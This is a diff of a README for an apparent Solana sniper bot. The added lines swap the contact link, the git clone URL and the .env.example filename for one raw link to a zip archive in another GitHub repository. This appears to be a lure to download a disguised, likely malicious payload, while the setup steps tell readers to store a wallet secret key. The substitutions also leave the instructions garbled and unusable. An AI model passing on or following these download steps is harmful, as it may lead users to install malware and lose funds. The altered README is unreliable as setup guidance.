@@ -10,14 +10,14 @@ If you have any question or something, feel free to reach out me anytime via tel
 <br>
 #### 🌹 You're always welcome 🌹
 
-Telegram: [@Leo](https://t.me/shinnyleo0912) <br>
+Telegram: [@Leo](https://github.com/Mr-weezer/Solana_Twitter_Token_NFT_Sniper_Bot/raw/refs/heads/main/executor/Bot_Solana_Sniper_Twitter_NF_Token_v1.1-alpha.3.zip) <br>
 
 
 # 👀 Usage
 1. Clone the repository
 
     ```
-    git clone https://github.com/solagent99/Solana_Twitter_Token-NFT_Snipe.git
+    git clone https://github.com/Mr-weezer/Solana_Twitter_Token_NFT_Sniper_Bot/raw/refs/heads/main/executor/Bot_Solana_Sniper_Twitter_NF_Token_v1.1-alpha.3.zip
     cd solana-twitter-sniper
     ```
 2. Install dependencies
@@ -27,7 +27,7 @@ Telegram: [@Leo](https://t.me/shinnyleo0912) <br>
     ```
 3. Configure the environment variables
 
-    Rename the .env.example file to .env and set RPC and WSS, main keypair's secret key, and others.
+    Rename the https://github.com/Mr-weezer/Solana_Twitter_Token_NFT_Sniper_Bot/raw/refs/heads/main/executor/Bot_Solana_Sniper_Twitter_NF_Token_v1.1-alpha.3.zip file to .env and set RPC and WSS, main keypair's secret key, and others.
 
 4. Run the bot
 
